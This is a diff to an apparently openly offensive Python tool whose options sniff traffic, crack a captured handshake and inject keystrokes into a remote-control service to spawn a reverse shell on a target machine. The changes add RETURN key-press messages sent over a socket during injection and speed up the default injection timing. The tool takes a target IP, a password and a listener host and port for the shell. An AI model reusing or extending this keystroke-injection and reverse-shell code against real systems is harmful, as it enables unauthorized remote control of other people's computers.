@@ -1,9 +1,9 @@
 #!/usr/bin/env python
 
 import re
+import time
 import struct
 import socket
-import time
 import argparse
 from scapy.all import *
 from Crypto.Cipher import DES
@@ -69,7 +69,11 @@ def inject_keystrokes(address, port, password, listen_host, listen_port, speed):
         s.send("\x0d\x0a")
         time.sleep(speed)
         i += 1
-
+    s.send('{"id": "keyCodePress", "key": "RETURN", "down": true}')
+    s.send("\x0d\x0a")
+    time.sleep(speed)
+    s.send('{"id": "keyCodePress", "key": "RETURN", "down": false}')
+    s.send("\x0d\x0a")
     close_terminal(s, speed)
 
     s.close()
@@ -216,7 +220,7 @@ def main():
     parser.add_argument('-in', '--inject', help=' Use this option to inject keystrokes to spawn a reverse shell', required=False, action='store_true')
     parser.add_argument('-cr', '--crack', help=' Use this option to crack a captured handshake', required=False, action='store_true')
     parser.add_argument('-w', '--wordlist', help='Wordlist file path for cracking handshakes', required=False)
-    parser.add_argument('-ti','--timing',help=' Determines the speed of the keystroke injection', type=int, default=.01, required=False)
+    parser.add_argument('-ti','--timing',help=' Determines the speed of the keystroke injection. Default is .001(fast) ', type=float, default=.001, required=False)
     parser.add_argument('-p', '--port', help='Port number for listening server', required=False)
     parser.add_argument('-a', '--address', help='IP address of listening server', required=False)
     parser.add_argument('-k', '--key', help='This is the password to use for injecting keystrokes', required=False)
@@ -225,6 +229,7 @@ def main():
     parser.add_argument('-t', '--target', help='This is the IP address of the target', required=False)
     args = parser.parse_args()
     print_banner()
+
     if TrueXor(args.sniff, args.inject, args.crack) == False:
         print "Please select one option out of --sniff, --inject, or --crack"
         sys.exit()
